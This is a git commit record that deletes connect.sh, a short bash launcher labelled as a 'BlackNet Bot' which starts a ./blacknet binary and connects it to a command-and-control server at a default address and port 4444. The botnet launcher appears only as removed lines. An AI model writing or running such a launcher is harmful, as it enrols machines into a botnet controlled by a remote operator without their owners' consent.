e0524b302aa4561ba0ce1b6024c3193702d7d910
lolhecks <davonhotbox@gmail.com>
2026-06-10 07:09:59 -0400

    Delete connect.sh

--- connect.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-# BlackNet Bot — connect to C2 server
-
-C2_IP="${1:-192.168.1.100}"
-C2_PORT="${2:-4444}"
-
-echo "[+] Starting bot, connecting to $C2_IP:$C2_PORT ..."
-./blacknet --connect "$C2_IP:$C2_PORT"
